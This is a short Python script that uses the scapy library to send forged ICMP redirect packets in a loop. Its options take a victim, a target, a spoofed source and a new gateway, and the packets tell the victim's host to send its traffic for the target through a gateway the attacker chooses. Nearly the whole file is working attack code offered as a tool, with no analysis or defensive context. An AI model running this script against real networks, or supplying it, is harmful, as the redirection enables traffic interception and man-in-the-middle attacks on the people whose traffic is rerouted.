#! /usr/bin/env python
#! -*- coding:utf8 -*-

from scapy.all import *
from time import sleep

def attack(victim, target, source, gateway):
    ip = IP(dst=victim, src=source)
    icmp = ICMP(type=5, code=1, gw=gateway)
    redirectedip = IP(dst=target, src=victim)
    while True:
        send(ip/icmp/redirectedip/UDP())
        sleep(1)

def main():
    from sys import argv
    from optparse import OptionParser
    msgUsage = "%prog"
    opt = OptionParser(msgUsage)
    opt.add_option("-v", "--victim",  action = "store", dest = "victim", help = "victim IP address")
    opt.add_option("-t", "--target",  action = "store", dest = "target", help = "target IP you want to poisoning")
    opt.add_option("-g", "--gateway", action = "store", dest = "gateway", help = "new gateway for the poisoned destination")
    opt.add_option("-s", "--source", action = "store", dest = "source", help = "source IP address of the ICMP message")
    args = opt.parse_args(argv[1:])
    if not args[0].victim or not args[0].target or not args[0].source or not args[0].gateway:
        opt.print_help()
    else:
        attack(args[0].victim, args[0].target, args[0].source, args[0].gateway)

if __name__ == '__main__':
    main()
